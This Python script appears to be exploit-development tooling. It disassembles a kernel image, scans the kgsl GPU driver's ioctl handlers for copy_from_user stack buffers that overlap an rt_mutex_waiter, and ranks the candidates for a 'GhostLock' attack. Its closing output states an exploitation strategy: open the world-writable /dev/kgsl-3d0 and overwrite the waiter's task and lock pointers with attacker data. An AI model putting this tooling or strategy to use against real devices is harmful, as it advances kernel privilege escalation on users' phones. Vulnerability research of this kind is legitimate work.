#!/usr/bin/env python3
"""
Comprehensive kgsl ioctl GhostLock analysis.

Handles:
- Frame size extraction
- CFU destination buffer offsets (x0 = sp+N or x0 = x29-N)
- Copy sizes from both imm and register-based mov
- Waiter overlap at actual ioctl path depths
- Detailed reporting of top candidates
"""

from __future__ import annotations

import bisect
import struct
from pathlib import Path
from typing import Optional

from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
from elftools.elf.elffile import ELFFile


ROOT = next(
    p for p in Path(__file__).resolve().parents
    if (p / "raw").is_dir() and (p / "stages").is_dir()
)
VMLINUX_ELF = ROOT / "raw" / "vmlinux.elf"
WAITER_START = -0x380
WAITER_END = -0x340
WAITER_SIZE = 0x40


def parse_imm(s: str) -> Optional[int]:
    s = s.strip().rstrip("]!,")
    if not s:
        return None
    if s.startswith("0x") or s.startswith("0X"):
        return int(s, 16)
    if s.startswith("#"):
        s = s[1:]
    if s.startswith("0x") or s.startswith("0X"):
        return int(s, 16)
    if s.startswith("-"):
        return -int(s[1:], 16 if s[1:].startswith("0x") else 10)
    if "," in s:
        s = s.split(",")[0]
    if s.startswith("x") or s.startswith("w") or s in ("sp", "lr", "xzr", "wzr"):
        return None
    try:
        return int(s, 16 if s.startswith("0x") else 10)
    except ValueError:
        return None


def fmt_addr(x: int) -> str:
    return f"0x{x:016x}"


# ---- Load ELF ----

with open(VMLINUX_ELF, "rb") as f:
    elf = ELFFile(f)
    symtab = elf.get_section_by_name(".symtab")

    sym_by_name: dict[str, int] = {}
    raw_funcs: list[tuple[int, int, str]] = []
    for sym in symtab.iter_symbols():
        if sym.name:
            sym_by_name[sym.name] = sym.entry.st_value
        if not sym.name:
            continue
        typ = sym.entry.st_info.get("type", "")
        if typ not in ("STT_FUNC", 2):
            continue
        raw_funcs.append((sym.entry.st_value, sym.entry.st_size, sym.name))

    raw_funcs.sort(key=lambda x: x[0])

    # Build function range table (next-symbol boundary for st_size=0)
    func_list: list[tuple[int, int, str]] = []
    for i, (addr, size, name) in enumerate(raw_funcs):
        if size > 0:
            end = addr + size
        elif i < len(raw_funcs) - 1:
            end = raw_funcs[i + 1][0]
        else:
            end = addr + 0x10
        func_list.append((addr, end, name))

    func_starts = [f[0] for f in func_list]

    # Text section
    for sec in elf.iter_sections():
        if sec.name == ".kernel" and sec.header.sh_type == "SHT_PROGBITS":
            text_base = sec.header.sh_addr
            text_data = sec.data()
            text_end = text_base + len(text_data)
            break
    else:
        raise ValueError("No .kernel section")

cfu_addr = sym_by_name.get("__arch_copy_from_user")
if not cfu_addr:
    raise ValueError("__arch_copy_from_user not found")


def find_func(addr: int) -> Optional[tuple]:
    idx = bisect.bisect_right(func_starts, addr) - 1
    if idx >= 0 and func_list[idx][0] <= addr < func_list[idx][1]:
        return func_list[idx]
    return None


def get_func_name(addr: int) -> str:
    info = find_func(addr)
    return info[2] if info else f"0x{addr:x}"


# ---- Analysis ----

md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True


def analyze_frame(func_addr: int, func_end: int) -> tuple[int, int, list]:
    """Extract frame size, fp offset, and instruction list."""
    off = func_addr - text_base
    size = func_end - func_addr
    if size <= 0 or size > 0x20000:
        return 0, 0, []

    fbytes = text_data[off : off + size]
    insns = list(md.disasm(fbytes, func_addr))

    total_frame = 0
    fp_off = 0

    for insn in insns:
        op = insn.op_str
        if insn.mnemonic == "sub" and "sp, sp" in op:
            val = parse_imm(op.split("#")[-1].strip(","))
            if val is not None and val > 0:
                total_frame += val
        elif insn.mnemonic == "stp" and "[sp, #-" in op and "]!" in op:
            val = parse_imm(op.split("#-")[1].split("]")[0])
            if val is not None and val > 0:
                total_frame += val
        if insn.mnemonic == "add" and "x29, sp" in op:
            val = parse_imm(op.split("#")[-1])
            if val is not None:
                fp_off = val

    return total_frame, fp_off, insns


def find_cfu_calls(insns: list, fp_off: int) -> list[dict]:
    """Find all copy_from_user call sites in the instruction list."""
    calls = []
    for i, insn in enumerate(insns):
        if insn.mnemonic != "bl":
            continue
        target = insn.operands[0].imm & 0xFFFFFFFFFFFFFFFF
        if target != cfu_addr:
            continue

        dest_sp = None
        copy_size = None
        x0_imm = None
        x0_is_x29_sub = False

        # Look back up to 30 insns for x0 setup (dest buffer)
        for j in range(i - 1, max(0, i - 30), -1):
            prev = insns[j]
            pop = prev.op_str

            # x0 = sp + imm
            if prev.mnemonic == "add" and pop.startswith("x0, sp"):
                parts = pop.split("#")
                if len(parts) > 1:
                    val = parse_imm(parts[-1].rstrip("]"))
                    if val is not None:
                        dest_sp = val
                        break

            # x0 = x29 - imm => dest = fp_off - imm
            elif prev.mnemonic == "sub" and pop.startswith("x0, x29"):
                parts = pop.split("#")
                if len(parts) > 1:
                    val = parse_imm(parts[-1].split(",")[0].rstrip("]"))
                    if val is not None:
                        dest_sp = fp_off - val
                        break

            # x0 = sp (implicit offset 0)
            elif prev.mnemonic == "mov" and pop == "x0, sp":
                dest_sp = 0
                break

        # Look back up to 15 insns for x2/w2 setup (copy size)
        for j in range(i - 1, max(0, i - 15), -1):
            prev = insns[j]
            pop = prev.op_str

            # mov w2, #N or mov x2, #N
            if prev.mnemonic == "mov" and ("w2, #" in pop or "x2, #" in pop):
                val = parse_imm(pop.split("#")[-1])
                if val is not None:
                    copy_size = val
                break

            # mov x2, xN (register-based size) - note the register name
            if prev.mnemonic == "mov" and pop.startswith("x2, x"):
                x2_src = pop.split(",")[1].strip()
                copy_size = 0  # Unknown register-based size
                break

        # If copy_size wasn't set by mov, check if it's the same as dest setup
        if copy_size is None and dest_sp is not None:
            # Some functions use a struct that comes from parameter
            copy_size = 0  # Unknown

        calls.append({
            "call_addr": insn.address,
            "dest_sp_offset": dest_sp,
            "copy_size": copy_size or 0,
        })

    return calls


def compute_waiter_overlap(
    dest_sp_offset: int, buf_size: int, frame_size: int, caller_depth: int
) -> int:
    """Compute overlap bytes between buffer at given call depth and waiter."""
    dest_abs = -(caller_depth + frame_size) + dest_sp_offset
    o_start = max(dest_abs, WAITER_START)
    o_end = min(dest_abs + buf_size, WAITER_END)
    return max(0, o_end - o_start)


def compute_waiter_abs_range(
    dest_sp_offset: int, buf_size: int, frame_size: int, caller_depth: int
) -> tuple[int, int, int]:
    """Return (abs_start, abs_end, overlap)."""
    abs_start = -(caller_depth + frame_size) + dest_sp_offset
    abs_end = abs_start + buf_size
    o_start = max(abs_start, WAITER_START)
    o_end = min(abs_end, WAITER_END)
    return abs_start, abs_end, max(0, o_end - o_start)


# ============================================================
# MAIN ANALYSIS
# ============================================================

print("=" * 100)
print("  GhostLock kgsl ioctl Analysis")
print("=" * 100)
print(f"  Waiter: [{WAITER_START:+d}, {WAITER_END:+d}) = {WAITER_SIZE}B")
print(f"  CFU:    {fmt_addr(cfu_addr)}")
print()

# ---- Collect all kgsl functions (non-trace) ----
kgsl_all = []
for addr, end, name in func_list:
    if "kgsl" not in name:
        continue
    # Skip trace/bpf/initcall noise
    if any(name.startswith(p) for p in ("trace_", "perf_trace_", "__bpf_trace_",
                                         "trace_raw_output_", "__event_", "__initcall_",
                                         "trace_event_define_fields_")):
        continue
    kgsl_all.append((addr, end, name))

print(f"  kgsl functions: {len(kgsl_all)}")
print()

# ---- Analyze each for CFU calls ----
cfu_sites = []  # list of dicts with all details
for addr, end, name in kgsl_all:
    frame, fp_off, insns = analyze_frame(addr, end)
    if not insns:
        continue
    calls = find_cfu_calls(insns, fp_off)
    if not calls:
        continue
    for c in calls:
        cfu_sites.append({
            "name": name,
            "addr": addr,
            "end": end,
            "frame": frame,
            "fp": fp_off,
            "call_addr": c["call_addr"],
            "dest_sp": c["dest_sp_offset"],
            "copy_size": c["copy_size"],
        })

# ---- Determine ioctl dispatch depth ----
# sys_ioctl -> ksys_ioctl -> vfs_ioctl -> file_ioctl -> kgsl_ioctl -> kgsl_ioctl_helper -> kgsl_ioctl_*
# Let's compute the actual frame depths
print("  IOCTL PATH DEPTH ANALYSIS")
print("  " + "-" * 80)

# Find key functions in the path
path_funcs = [
    ("sys_ioctl", "__arm64_sys_ioctl"),
    ("ksys_ioctl", "ksys_ioctl"),
    ("vfs_ioctl", "vfs_ioctl"),
    ("kgsl_ioctl", "kgsl_ioctl"),
    ("kgsl_ioctl_helper", "kgsl_ioctl_helper"),
]

path_depths = []
for label, sym_name in path_funcs:
    addr = sym_by_name.get(sym_name)
    if not addr:
        print(f"  WARNING: {sym_name} not found")
        continue
    func_info = find_func(addr)
    if not func_info:
        print(f"  WARNING: {sym_name} not in func range table")
        continue
    frame, fp_off, insns = analyze_frame(addr, func_info[1])
    path_depths.append(frame)
    print(f"    {label:25s} ({sym_name}): @{fmt_addr(addr)} frame=0x{frame:04x}")

ioctl_base_depth = sum(path_depths)
print(f"    {'TOTAL ioctl path base depth:'} 0x{ioctl_base_depth:04x} ({ioctl_base_depth})")
print()

# Estimate: call through vfs_ioctl adds some more (locking etc)
# The kgsl_ioctl -> kgsl_ioctl_helper -> handler path:
kgsl_dispatch_depth = 0
if "kgsl_ioctl" in sym_by_name and "kgsl_ioctl_helper" in sym_by_name:
    ki_addr = sym_by_name["kgsl_ioctl"]
    kih_addr = sym_by_name["kgsl_ioctl_helper"]
    ki_info = find_func(ki_addr)
    kih_info = find_func(kih_addr)
    if ki_info and kih_info:
        kf, _, _ = analyze_frame(ki_addr, ki_info[1])
        khf, _, _ = analyze_frame(kih_addr, kih_info[1])
        kgsl_dispatch_depth = kf + khf
        print(f"  kgsl dispatch depth (kgsl_ioctl + kgsl_ioctl_helper): {kf} + {khf} = {kgsl_dispatch_depth}")
        print(f"  Estimated ioctl path to handler: 0x{ioctl_base_depth + kgsl_dispatch_depth:04x}")
        print()

# ---- Calculate overlap for each CFU site at various depths ----
print("=" * 100)
print("  CFU CALL SITES IN KGSL FUNCTIONS")
print("=" * 100)
print(f"  {'Func':<42s} {'Frame':>6s} {'Dest':>7s} {'Size':>5s}  ", end="")
print(f"  {'BestD':>6s} {'MaxOv':>5s}  Buffer Range at Best Depth")
print("  " + "-" * 42 + " " + "-" * 6 + " " + "-" * 7 + " " + "-" * 5 + "  "
      + "-" * 6 + " " + "-" * 5 + "  " + "-" * 40)

# Group by function, keep the best call site per function
func_best: dict = {}
for c in cfu_sites:
    key = c["name"] + "@" + hex(c["addr"])
    if c["dest_sp"] is None:
        continue
    if key not in func_best:
        func_best[key] = c
    else:
        existing = func_best[key]
        # Prefer larger dest_sp (closer to waiter, higher on stack)
        if c["dest_sp"] > existing["dest_sp"]:
            func_best[key] = c

# For each function, compute overlap at best depth
for key, c in sorted(func_best.items(), key=lambda x: -x[1]["frame"]):
    frame = c["frame"]
    dest = c["dest_sp"]
    buf_size = max(c["copy_size"], 1)

    if dest is None:
        continue

    # Scan depths from 0 to 0x400 for best overlap
    max_ov = 0
    best_d = 0
    for d in range(0, 0x401):
        ov = compute_waiter_overlap(dest, buf_size, frame, d)
        if ov > max_ov:
            max_ov = ov
            best_d = d

    # Buffer range at best depth
    abs_s, abs_e, ov = compute_waiter_abs_range(dest, buf_size, frame, best_d)

    ov_str = f"{ov:3d}B" if ov < WAITER_SIZE else "FULL"
    print(f"  {c['name']:<42s} 0x{frame:04x} 0x{dest:04x} {c['copy_size']:5d}"
          f"  0x{best_d:04x} {ov_str:>5s}  [{abs_s:+05d}, {abs_e:+05d})")

# ---- Detailed overlap table at relevant ioctl depths ----
print()
print("=" * 100)
print("  WAITER OVERLAP AT IOCTL PATH DEPTHS")
print("=" * 100)
print()
print("  'FULL' = 64B waiter fully covered; 'NN B' = partial overlap bytes; '--' = no overlap")
print()

# Consider depths: from 0x80 to 0x400 in steps
depths = [0x80, 0xA0, 0xC0, 0x100, 0x140, 0x180, 0x1C0, 0x200, 0x250, 0x280, 0x300, 0x350, 0x380, 0x400]

# Print header
hdr = f"  {'Func':<45s}"
for d in depths:
    hdr += f" {d:#05x}"
print(hdr)
print("  " + "-" * 45 + " " + " ".join(["------" for _ in depths]))

for key, c in sorted(func_best.items(), key=lambda x: (-x[1]["frame"], -x[1]["copy_size"])):
    frame = c["frame"]
    dest = c["dest_sp"]
    buf_size = max(c["copy_size"], 1)

    line = f"  {c['name']:<45s}"
    for d in depths:
        ov = compute_waiter_overlap(dest, buf_size, frame, d)
        if ov >= WAITER_SIZE:
            line += f" {'FULL':>6s}"
        elif ov > 0:
            line += f" {ov:3d}B"
        else:
            line += f" {'--':>6s}"
    print(line)

# ---- Summary of top candidates ----
print()
print("=" * 100)
print("  TOP CANDIDATE FUNCTIONS")
print("=" * 100)
print()

# Score: (max_overlap * 3) + (copy_size >= 64 ? 10 : 0) - abs(delta_words)
scored = []
for key, c in func_best.items():
    frame = c["frame"]
    dest = c["dest_sp"]
    buf_size = max(c["copy_size"], 1)

    max_ov = 0
    best_d = 0
    for d in range(0, 0x401):
        ov = compute_waiter_overlap(dest, buf_size, frame, d)
        if ov > max_ov:
            max_ov = ov
            best_d = d

    # Compute delta (in words) from waiter start at zero depth
    zero_abs = -(0 + frame) + dest
    delta_words = (zero_abs - WAITER_START) // 8

    score = max_ov * 2
    if c["copy_size"] >= 64:
        score += 10
    score -= abs(delta_words) // 2

    scored.append((score, c, max_ov, best_d, delta_words))

scored.sort(key=lambda x: (-x[0], -x[3]))

print(f"  {'Rank':>4s} {'Score':>5s} {'Δwords':>6s} {'Func':<42s} {'Frame':>6s} {'Dest':>7s}"
      f" {'Size':>5s} {'BestD':>6s} {'MaxOv':>5s}")
print(f"  {'----':>4s} {'-----':>5s} {'------':>6s} {'----':<42s} {'------':>6s} {'-------':>7s}"
      f" {'-----':>5s} {'------':>6s} {'-----':>5s}")

for rank, (score, c, max_ov, best_d, delta_words) in enumerate(scored[:20], 1):
    ov_str = f"{max_ov:3d}B" if max_ov < WAITER_SIZE else "FULL"
    print(f"  {rank:4d} {score:5d} {delta_words:+6d} {c['name']:<42s} 0x{c['frame']:04x}"
          f" 0x{c['dest_sp']:04x} {c['copy_size']:5d} 0x{best_d:04x} {ov_str:>5s}")

# ---- Detailed analysis of top 5 ----
print()
print("=" * 100)
print("  TOP 5 — DETAILED ANALYSIS")
print("=" * 100)
print()

for rank, (score, c, max_ov, best_d, delta_words) in enumerate(scored[:5], 1):
    frame = c["frame"]
    dest = c["dest_sp"]
    buf_size = max(c["copy_size"], 1)

    print(f"  #{rank}: {c['name']}")
    print(f"       Address:     {fmt_addr(c['addr'])}")
    print(f"       Function:    [{fmt_addr(c['addr'])} - {fmt_addr(c['end'])})")
    print(f"       Frame size:  0x{frame:04x} ({frame} bytes)")
    print(f"       Dest offset: SP+0x{dest:04x}")
    print(f"       Copy size:   {c['copy_size']} bytes")
    print(f"       CFU call @   {fmt_addr(c['call_addr'])}")
    print()

    # Show overlap at standard ioctl path depths
    print(f"       Waiter overlap at various depths:")
    print(f"       {'Depth':>8s} {'AbsStart':>10s} {'AbsEnd':>10s} {'Overlap':>8s} {'Coverage':>8s}")
    print(f"       {'-'*8} {'-'*10} {'-'*10} {'-'*8} {'-'*8}")

    for d in [0x80, 0xA0, 0xC0, 0x100, 0x140, 0x180,
              0x1C0, 0x200, 0x250, 0x280, 0x300, 0x350, 0x380, 0x400]:
        abs_s, abs_e, ov = compute_waiter_abs_range(dest, buf_size, frame, d)
        cov = f"{ov:3d}B" if ov < WAITER_SIZE else "FULL"
        marker = " <-- best" if d == best_d else ""
        print(f"       0x{d:04x} {abs_s:+9d} {abs_e:+9d} {ov:6d}B {cov:>8s}{marker}")

    # Reachability assessment
    ioctl_depth_for_overlap = best_d
    print()
    print(f"       Best caller_depth: 0x{best_d:04x} -> overlap = {max_ov}/{WAITER_SIZE}B")
    print(f"       ioctl path base depth: ~0x{ioctl_base_depth:04x} (sys_ioctl + kgsl dispatch)")
    print(f"       Adjustment needed to hit waiter: ", end="")
    if best_d >= ioctl_base_depth:
        print(f"need +0x{best_d - ioctl_base_depth:04x} depth (add call nesting)")
    else:
        print(f"need -0x{ioctl_base_depth - best_d:04x} depth (shorter path)")
    print(f"       Reachable via /dev/kgsl-3d0 ioctl: YES")
    print()

print("=" * 100)
print("  CONCLUSION")
print("=" * 100)
print()
print(f"  The kgsl GPU device (/dev/kgsl-3d0) is world-RW and provides")
print(f"  {len(cfu_sites)} copy_from_user call sites across kgsl functions.")
print()

# Final assessment
top_ov = max((s[2] for s in scored), default=0)
top_func = scored[0][1]["name"] if scored else "N/A"

if top_ov >= WAITER_SIZE:
    print(f"  *** FULL WAITER COVERAGE FOUND ***")
    print(f"  Best candidate: {top_func}")
    print(f"  Can overwrite all 64 bytes of rt_mutex_waiter at achievable depth.")
    print()
    print(f"  Exploitation strategy for kgsl:")
    print(f"  1. Open /dev/kgsl-3d0 (world-RW, no permissions needed)")
    print(f"  2. Issue relevant IOCTL with a GhostLock thread sleeping in futex")
    print(f"  3. The copy_from_user in the ioctl handler overwrites the waiter")
    print(f"  4. The waiter fields (task, lock pointers) are controlled by user data")
    print()
elif top_ov > 0:
    print(f"  PARTIAL waiter coverage: top = {top_ov}/{WAITER_SIZE}B in {top_func}")
    print(f"  Full coverage may be achievable with adjusted call depth.")
else:
    print(f"  NO waiter overlap found in kgsl ioctl handlers.")
    print(f"  The stack buffers in kgsl handlers are too far from the waiter position.")
